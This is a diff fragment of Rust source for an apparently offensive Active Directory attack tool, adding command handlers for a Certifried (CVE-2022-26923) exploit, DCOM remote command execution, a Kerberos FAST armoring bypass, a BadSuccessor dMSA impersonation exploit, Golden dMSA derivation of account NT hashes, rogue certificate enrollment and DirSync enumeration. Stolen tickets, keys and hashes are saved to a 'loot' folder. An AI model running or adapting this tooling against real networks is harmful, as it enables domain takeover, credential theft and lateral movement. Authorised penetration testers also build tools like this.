+    new_password: &str,
+    reset: bool,
+) -> i32 {
+    banner::print_module_banner("KPASSWD");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
+
+    let config = KpasswdConfig {
+        dc_ip: dc.to_string(),
+        domain: creds.domain.clone(),
+        username: creds.username.clone(),
+        secret,
+        use_hash,
+        new_password: new_password.to_string(),
+        port: 464,
+    };
+
+    let result = if reset {
+        match target_user {
+            Some(u) => kpasswd_reset_password(&config, u).await,
+            None => {
+                banner::print_fail("--target-user is required for password reset");
+                return 1;
+            }
+        }
+    } else {
+        kpasswd_change_password(&config).await
+    };
+
+    match result {
+        Ok(r) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": if r.success { "success" } else { "failure" },
+                        "message": r.message,
+                        "result_code": r.result_code,
+                    }),
+                );
+            }
+
+            if r.success {
+                println!(
+                    "{} Password {} succeeded: {}",
+                    "[+]".green(),
+                    if reset { "reset" } else { "change" },
+                    r.message.cyan()
+                );
+                banner::print_success("kpasswd completed");
+                0
+            } else {
+                banner::print_fail(&format!("kpasswd failed: {}", r.message));
+                1
+            }
+        }
+        Err(e) => {
+            banner::print_fail(&format!("kpasswd failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_describe_ticket -- parse KIRBI/ccache
+// ----------------------------------------------
+
+pub async fn cmd_describe_ticket(cli: &Cli, file: &str) -> i32 {
+    banner::print_module_banner("DESCRIBE TICKET");
+
+    let bytes = match std::fs::read(file) {
+        Ok(b) => b,
+        Err(e) => {
+            banner::print_fail(&format!("Failed to read ticket file: {e}"));
+            return 1;
+        }
+    };
+
+    let description =
+        if bytes.starts_with(b"\x76\xff\xff\xff") || bytes.starts_with(b"\x76\x01\x00\x00") {
+            // Microsoft KIRBI format starts with 0x76 (APPLICATION 10 TAG)
+            format!("KIRBI file: {} bytes", bytes.len())
+        } else if bytes.starts_with(b"krb5cc-") || bytes.starts_with(b"krb5cc_") {
+            format!("ccache file: {} bytes", bytes.len())
+        } else {
+            format!("Unknown ticket format: {} bytes", bytes.len())
+        };
+
+    if wants_json(cli) {
+        return emit_json(
+            cli,
+            serde_json::json!({
+                "status": "success",
+                "file": file,
+                "size": bytes.len(),
+                "description": description,
+                "hex_header": hex::encode(&bytes[..bytes.len().min(16)]),
+            }),
+        );
+    }
+
+    println!("{} {}", "[+]".green(), file.cyan());
+    println!("{} {}", ">".bright_black(), description);
+    println!(
+        "{} Header: {}",
+        ">".bright_black(),
+        hex::encode(&bytes[..bytes.len().min(16)])
+    );
+    banner::print_success("Ticket described");
+    0
+}
+
+// ----------------------------------------------
+// cmd_certifried -- CVE-2022-26923
+// ----------------------------------------------
+
+pub async fn cmd_certifried(
+    cli: &Cli,
+    ca_url: &str,
+    target_dc_fqdn: &str,
+    computer_name: Option<&str>,
+    computer_password: Option<&str>,
+    template: &str,
+    cleanup: bool,
+) -> i32 {
+    banner::print_module_banner("CERTIFRIED");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required for Certifried");
+            return 1;
+        }
+    };
+
+    let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
+        Ok(l) => l,
+        Err(e) => return e,
+    };
+
+    let config = CertifriedConfig {
+        ca_url: ca_url.to_string(),
+        domain,
+        dc_ip: dc,
+        username: creds.username.clone(),
+        password: creds.password().unwrap_or("").to_string(),
+        target_dc_fqdn: target_dc_fqdn.to_string(),
+        computer_name: computer_name.map(|s| s.to_string()),
+        computer_password: computer_password.map(|s| s.to_string()),
+        template: template.to_string(),
+        cleanup,
+    };
+
+    println!(
+        " {} Target DC: {} via CA {}",
+        ">".bright_black(),
+        target_dc_fqdn.cyan(),
+        ca_url.cyan()
+    );
+
+    match exploit_certifried_core(&mut ldap, &config).await {
+        Ok(result) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "computer_name": result.computer_name,
+                        "original_dns_hostname": result.original_dns_hostname,
+                        "has_certificate": result.certificate.is_some(),
+                        "has_kirbi": result.kirbi.is_some(),
+                        "message": result.message,
+                    }),
+                );
+            }
+
+            println!(
+                "{} Certifried succeeded: {}",
+                "[+]".green(),
+                result.message.cyan()
+            );
+            if let Some(ref kirbi) = result.kirbi {
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let path = loot_dir.join("certifried_tgt.kirbi");
+                if std::fs::write(&path, kirbi).is_ok() {
+                    println!("{} Saved TGT to {}", "->".cyan(), path.display());
+                }
+            }
+            banner::print_success("Certifried exploit completed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Certifried failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_dcomexec -- DCOM lateral movement
+// ----------------------------------------------
+
+pub async fn cmd_dcomexec(
+    cli: &Cli,
+    target: &str,
+    command: &str,
+    arguments: &str,
+    method: DcomExecMethod,
+    timeout_ms: u64,
+) -> i32 {
+    banner::print_module_banner("DCOMEXEC");
+
+    let core_method = match method {
+        DcomExecMethod::Mmc20Application => CoreDcomExecMethod::Mmc20Application,
+        DcomExecMethod::ShellWindows => CoreDcomExecMethod::ShellWindows,
+        DcomExecMethod::ShellBrowserWindow => CoreDcomExecMethod::ShellBrowserWindow,
+    };
+
+    let config = CoreDcomExecConfig {
+        target: target.to_string(),
+        command: command.to_string(),
+        arguments: arguments.to_string(),
+        method: core_method,
+        username: None,
+        password: None,
+        domain: None,
+        timeout_ms,
+    };
+
+    println!(
+        " {} {} on {} via {:?}",
+        ">".bright_black(),
+        command.yellow(),
+        target.cyan(),
+        method
+    );
+
+    match dcom_exec(&config).await {
+        Ok(result) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": if result.success { "success" } else { "failure" },
+                        "target": result.target,
+                        "command": result.command,
+                        "method": result.method,
+                        "message": result.message,
+                    }),
+                );
+            }
+
+            if result.success {
+                println!("{} {}", "[+]".green(), result.message.cyan());
+                banner::print_success("DCOMexec completed");
+                0
+            } else {
+                banner::print_fail(&result.message);
+                1
+            }
+        }
+        Err(e) => {
+            banner::print_fail(&format!("DCOMexec failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_as_req_st -- AS-Requested Service Ticket
+// ----------------------------------------------
+
+pub async fn cmd_as_req_st(
+    cli: &Cli,
+    dc: &str,
+    spn: &str,
+    creds: &Credentials,
+    use_hash: bool,
+    secret: &str,
+) -> Result<(), String> {
+    use overthrone_core::cred_cache::CredCache;
+    use overthrone_core::proto::kerberos;
+
+    let domain = creds.domain.clone();
+    info!(
+        "AS-REQ ST: requesting {spn} via AS-REQ path for {}@{}",
+        creds.username, domain
+    );
+
+    let st = kerberos::request_service_ticket_via_as_req(dc, &domain, spn, secret, use_hash)
+        .await
+        .map_err(|e| format!("AS-Requested ST failed: {e}"))?;
+
+    if wants_json(cli) {
+        return Ok(());
+    }
+
+    println!(
+        "{} Service ticket obtained via AS-REQ: {}@{}",
+        "[+]".green(),
+        spn.cyan(),
+        domain.cyan()
+    );
+
+    let loot_dir = std::path::PathBuf::from("./loot");
+    let _ = std::fs::create_dir_all(&loot_dir);
+    let kirbi_path = loot_dir.join(format!("as_req_st_{}.kirbi", spn.replace(['/', ':'], "_")));
+    let kirbi_bytes = kerberos::tgd_to_kirbi(&st);
+    if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
+        println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+    }
+
+    let cache = CredCache::new();
+    let _ = cache.save_tgt(&st);
+
+    Ok(())
+}
+
+// ----------------------------------------------
+// cmd_breakfast -- FAST armoring bypass
+// ----------------------------------------------
+
+pub async fn cmd_breakfast(
+    cli: &Cli,
+    dc: &str,
+    target: &str,
+    machine_name: Option<&str>,
+    machine_hash: Option<&str>,
+) -> i32 {
+    use overthrone_core::proto::breakfast::{BreakFastConfig, breakfast_request_tgt};
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let machine_name = match machine_name {
+        Some(n) => n.to_string(),
+        None => {
+            banner::print_fail("--machine-name is required for BreakFAST");
+            return 1;
+        }
+    };
+    let machine_nt_hash = match machine_hash {
+        Some(h) => h.to_string(),
+        None => {
+            banner::print_fail("--machine-hash is required for BreakFAST");
+            return 1;
+        }
+    };
+
+    let config = BreakFastConfig {
+        dc_ip: dc.to_string(),
+        domain: creds.domain.clone(),
+        machine_name,
+        machine_nt_hash,
+        target_user: target.to_string(),
+        etypes: vec![18, 23],
+    };
+
+    match breakfast_request_tgt(&config).await {
+        Ok(result) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "target_user": result.target_user,
+                        "armor_account": result.armor_account,
+                        "fast_used": result.fast_used,
+                    }),
+                );
+            }
+
+            println!(
+                "{} BreakFAST succeeded: TGT obtained for {} via {}",
+                "[+]".green(),
+                result.target_user.cyan(),
+                result.armor_account.cyan()
+            );
+
+            let loot_dir = std::path::PathBuf::from("./loot");
+            let _ = std::fs::create_dir_all(&loot_dir);
+            let kirbi_path = loot_dir.join("breakfast_tgt.kirbi");
+            let kirbi_bytes = overthrone_core::proto::kerberos::tgd_to_kirbi(&result.tgt);
+            if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
+                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+            }
+
+            banner::print_success("BreakFAST armored TGT obtained");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("BreakFAST failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_dmsa -- BadSuccessor + Golden dMSA
+// ----------------------------------------------
+
+pub async fn cmd_dmsa(cli: &Cli, action: &DmsaAction) -> i32 {
+    banner::print_module_banner("DMSA");
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+
+    match action {
+        DmsaAction::BadSuccessor {
+            target,
+            domain,
+            dmsa_name,
+            dmsa_password,
+            target_user_dn,
+        } => {
+            let domain = if domain.is_empty() {
+                match cli.domain.as_deref() {
+                    Some(d) => d.to_string(),
+                    None => {
+                        banner::print_fail("--domain is required for BadSuccessor");
+                        return 1;
+                    }
+                }
+            } else {
+                domain.to_string()
+            };
+
+            let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
+                Ok(l) => l,
+                Err(e) => return e,
+            };
+
+            let target_user_dn = match target_user_dn {
+                Some(dn) => dn.clone(),
+                None => {
+                    banner::print_fail("--target-user-dn is required for BadSuccessor");
+                    return 1;
+                }
+            };
+
+            let target_sam = target_user_dn
+                .split(',')
+                .next()
+                .and_then(|p| p.strip_prefix("CN="))
+                .unwrap_or("target")
+                .to_string();
+
+            let config = overthrone_core::postex::BadSuccessorConfig {
+                domain,
+                dc_ip: dc.clone(),
+                target_ou: format!(
+                    "CN=Users,DC={}",
+                    creds.domain.split('.').collect::<Vec<_>>().join(",DC=")
+                ),
+                target_user_dn,
+                target_sam,
+                dmsa_name: Some(dmsa_name.clone()),
+                dmsa_password: Some(dmsa_password.clone()),
+            };
+
+            println!(
+                " {} BadSuccessor exploit against {} via dMSA {}",
+                ">".bright_black(),
+                target.cyan(),
+                dmsa_name.cyan()
+            );
+
+            match overthrone_core::postex::exploit_bad_successor(&mut ldap, &config).await {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "dmsa_dn": result.dmsa_dn,
+                                "dmsa_sam": result.dmsa_sam,
+                                "impersonated_user": result.impersonated_user,
+                                "domain_sid": result.domain_sid,
+                            }),
+                        );
+                    }
+
+                    println!(
+                        "{} Created dMSA {} and obtained TGT for {}",
+                        "[+]".green(),
+                        result.dmsa_sam.cyan(),
+                        result.impersonated_user.cyan()
+                    );
+                    println!(
+                        "{} Clean up with: ovt dmsa bad-successor --target <dc> --target-user-dn {}",
+                        "!".yellow(),
+                        result.dmsa_dn.dimmed()
+                    );
+                    banner::print_success("BadSuccessor exploit completed");
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("BadSuccessor failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        DmsaAction::Golden {
+            kds_key_file,
+            domain,
+            target_dc,
+            list_only,
+            output,
+        } => {
+            let domain = domain
+                .as_ref()
+                .map(|d| d.to_string())
+                .or_else(|| cli.domain.clone())
+                .unwrap_or_default();
+            if domain.is_empty() {
+                banner::print_fail("--domain is required for Golden dMSA");
+                return 1;
+            }
+
+            let kds_key = match kds_key_file {
+                Some(path) => {
+                    let bytes = match std::fs::read(path) {
+                        Ok(b) => b,
+                        Err(e) => {
+                            banner::print_fail(&format!("Failed to read KDS key file: {e}"));
+                            return 1;
+                        }
+                    };
+                    match overthrone_core::postex::parse_kds_root_key(&bytes) {
+                        Ok(k) => Some(k),
+                        Err(e) => {
+                            banner::print_fail(&format!("Failed to parse KDS key: {e}"));
+                            return 1;
+                        }
+                    }
+                }
+                None => {
+                    println!(
+                        "{} No KDS key file provided; MSA enumeration only",
+                        "!".yellow()
+                    );
+                    None
+                }
+            };
+
+            if kds_key.is_none() && !list_only {
+                banner::print_fail("--kds-key-file is required unless --list-only is set");
+                return 1;
+            }
+
+            let dc_to_use = target_dc
+                .as_ref()
+                .map(|s| s.as_str())
+                .unwrap_or(dc.as_str());
+            let mut ldap = match connect_ldap_session(dc_to_use, &domain, &creds).await {
+                Ok(l) => l,
+                Err(e) => return e,
+            };
+
+            match overthrone_core::postex::enumerate_msas(&mut ldap).await {
+                Ok(msas) => {
+                    if msas.is_empty() {
+                        println!(" {} No managed service accounts found", "!".yellow());
+                        return 0;
+                    }
+
+                    println!(
+                        "{} Found {} managed service account(s)",
+                        "[+]".green(),
+                        msas.len()
+                    );
+
+                    if *list_only {
+                        if wants_json(cli) {
+                            let msas_json: Vec<serde_json::Value> = msas
+                                .iter()
+                                .map(|m| {
+                                    serde_json::json!({
+                                        "sam_account_name": m.sam_account_name,
+                                        "distinguished_name": m.distinguished_name,
+                                    })
+                                })
+                                .collect();
+                            return emit_json(
+                                cli,
+                                serde_json::json!({
+                                    "status": "success",
+                                    "total": msas.len(),
+                                    "msas": msas_json,
+                                }),
+                            );
+                        }
+
+                        for msa in &msas {
+                            println!(
+                                " {} {} ({})",
+                                "[+]".green(),
+                                msa.sam_account_name.cyan(),
+                                msa.distinguished_name.dimmed()
+                            );
+                        }
+                        return 0;
+                    }
+
+                    let kds = match kds_key {
+                        Some(k) => k,
+                        None => {
+                            banner::print_fail("KDS key required for password derivation");
+                            return 1;
+                        }
+                    };
+
+                    let result = overthrone_core::postex::generate_msa_passwords(&kds, &msas);
+                    let passwords = result.msa_passwords;
+                    let errors = result.errors;
+
+                    if wants_json(cli) {
+                        let pw_json: Vec<serde_json::Value> = passwords
+                            .iter()
+                            .map(|p| {
+                                serde_json::json!({
+                                    "sam_account_name": p.sam_account_name,
+                                    "nt_hash": p.nt_hash,
+                                    "is_current": p.is_current,
+                                })
+                            })
+                            .collect();
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "status": "success",
+                                "total": passwords.len(),
+                                "errors": errors,
+                                "passwords": pw_json,
+                            }),
+                        );
+                    }
+
+                    for pw in &passwords {
+                        println!(
+                            "{} {} NT hash: {}",
+                            "[+]".green(),
+                            pw.sam_account_name.cyan(),
+                            pw.nt_hash.yellow()
+                        );
+                    }
+                    for err in &errors {
+                        eprintln!("{} {}", "!".yellow(), err);
+                    }
+
+                    if let Some(path) = output {
+                        let mut lines =
+                            vec!["sam_account_name,nt_hash,password,is_current".to_string()];
+                        for pw in &passwords {
+                            lines.push(format!(
+                                "{},{},{},{}",
+                                pw.sam_account_name, pw.nt_hash, pw.password, pw.is_current
+                            ));
+                        }
+                        if let Err(e) = std::fs::write(path, lines.join("\n")) {
+                            eprintln!("warn: failed to write CSV '{}': {e}", path);
+                        } else {
+                            println!("{} Saved to {}", "->".cyan(), path);
+                        }
+                    }
+
+                    if passwords.is_empty() && !errors.is_empty() {
+                        banner::print_fail(&format!(
+                            "Password derivation had {} error(s)",
+                            errors.len()
+                        ));
+                        return 1;
+                    }
+
+                    banner::print_success(&format!(
+                        "Derived {} gMSA/dMSA password(s)",
+                        passwords.len()
+                    ));
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("MSA enumeration failed: {e}"));
+                    1
+                }
+            }
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_certighost -- CA chase fallback enrollment
+// ----------------------------------------------
+
+pub async fn cmd_certighost(
+    cli: &Cli,
+    ca_server: &str,
+    ces_url: Option<&str>,
+    template: &str,
+    subject: Option<&str>,
+    san: Option<&str>,
+    dry_run: bool,
+) -> i32 {
+    banner::print_module_banner("CERTIGHOST");
+
+    let ces_url = ces_url
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| format!("https://{}/CES/", ca_server.trim_end_matches('/')));
+
+    let config = overthrone_core::postex::CertighostConfig {
+        ca_server: ca_server.to_string(),
+        ces_url,
+        use_proxy: false,
+        proxy_url: None,
+        template: template.to_string(),
+        subject: subject.map(|s| s.to_string()),
+        san: san.map(|s| s.to_string()),
+        key_size: 2048,
+        dry_run,
+    };
+
+    println!(
+        " {} CA server: {} | template: {}",
+        ">".bright_black(),
+        ca_server.cyan(),
+        template.cyan()
+    );
+
+    let config = config.clone();
+    let result = match tokio::task::spawn_blocking(move || {
+        overthrone_core::postex::certighost_auto_enroll(&config)
+    })
+    .await
+    {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("Certighost task failed: {e}"));
+            return 1;
+        }
+    };
+
+    match result {
+        Ok(r) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "subject": r.subject,
+                        "issuer": r.issuer,
+                        "template": r.template,
+                        "thumbnail": r.thumbnail,
+                        "message": r.message,
+                    }),
+                );
+            }
+
+            println!("{} {}", "[+]".green(), r);
+            if let Some(ref cert) = r.certificate {
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let cert_path = loot_dir.join("certighost_cert.pem");
+                if std::fs::write(&cert_path, cert).is_ok() {
+                    println!(
+                        "{} Saved certificate to {}",
+                        "->".cyan(),
+                        cert_path.display()
+                    );
+                }
+            }
+            if let Some(ref key) = r.private_key {
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let key_path = loot_dir.join("certighost_key.pem");
+                if std::fs::write(&key_path, key).is_ok() {
+                    println!(
+                        "{} Saved private key to {}",
+                        "->".cyan(),
+                        key_path.display()
+                    );
+                }
+            }
+            banner::print_success("Certighost enrollment completed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Certighost failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_dirsync -- OBJECT_SECURITY DirSync enumeration
+// ----------------------------------------------
+
+pub async fn cmd_dirsync(
+    cli: &Cli,
+    base_dn: Option<&str>,
+    include_sd: bool,
+    page_size: u32,
+    full: bool,
+) -> i32 {
+    banner::print_module_banner("DIRSYNC");
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required for DirSync");
+            return 1;
+        }
+    };
+
+    let base_dn = base_dn.map(|s| s.to_string()).unwrap_or_else(|| {
+        let parts: Vec<&str> = domain.split('.').collect();
+        format!("DC={}", parts.join(",DC="))
+    });
+
+    let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
+        Ok(l) => l,
+        Err(e) => return e,
+    };
+
+    let raw = match ldap.raw_ldap() {
+        Some(l) => l,
+        None => {
+            banner::print_fail(
+                "DirSync requires the standard LDAP connection (not pass-the-hash raw mode)",
+            );
+            return 1;
+        }
+    };
+
+    let config = overthrone_core::postex::DirSyncConfig {
+        base_dn,
+        cookie: Vec::new(),
+        page_size,
+        attributes: vec!["*".into(), "nTSecurityDescriptor".into()],
+        object_class: vec!["user".into(), "computer".into(), "group".into()],
+        include_sd,
+    };
+
+    let result = if full {
+        overthrone_core::postex::dirsync_full_sync(raw, &config).await
+    } else {
+        overthrone_core::postex::dirsync_enum(raw, &config).await
+    };
+
+    match result {
+        Ok(r) => {
+            if wants_json(cli) {
+                let entries_json: Vec<serde_json::Value> = r
+                    .entries
+                    .iter()
+                    .map(|e| {
+                        serde_json::json!({
+                            "dn": e.dn,
+                            "object_class": e.object_class,
+                            "object_guid": e.object_guid,
+                            "has_sd": e.security_descriptor.is_some(),
+                        })
+                    })
+                    .collect();
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "total": r.total_count,
+                        "more_data": r.more_data,
+                        "cookie_len": r.cookie.len(),
+                        "elapsed_seconds": r.elapsed_seconds,
+                        "entries": entries_json,
+                    }),
+                );
+            }
+
+            println!("{}", r);
+            println!(
+                "{} Found {} entries (more_data: {})",
+                "[+]".green(),
+                r.total_count,
+                r.more_data
+            );
+            for e in &r.entries[..r.entries.len().min(10)] {
+                println!("  {}", e);
+            }
+            if r.entries.len() > 10 {
+                println!("  ... and {} more", r.entries.len() - 10);
+            }
+            banner::print_success("DirSync enumeration completed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("DirSync failed: {e}"));
+            1
+        }
+    }
+}
+
+async fn connect_ldap_session(
+    dc: &str,
+    domain: &str,
+    creds: &Credentials,
+) -> std::result::Result<overthrone_core::proto::ldap::LdapSession, i32> {
+    if let Some(hash) = creds.nthash() {
+        match overthrone_core::proto::ldap::LdapSession::connect_with_hash(
+            dc,
+            domain,
+            &creds.username,
+            hash,
+            false,
+        )
+        .await
+        {
+            Ok(s) => Ok(s),
+            Err(e) => {
+                banner::print_fail(&format!("LDAP connect failed: {e}"));
+                Err(1)
+            }
+        }
+    } else {
+        match overthrone_core::proto::ldap::LdapSession::connect(
+            dc,
+            domain,
+            &creds.username,
+            creds.password().unwrap_or(""),
+            false,
+        )
+        .await
+        {
+            Ok(s) => Ok(s),
+            Err(e) => {
+                banner::print_fail(&format!("LDAP connect failed: {e}"));
+                Err(1)
+            }
+        }
+    }
 }
 
 /// Request a TGT with cache-first logic, using opsec options.
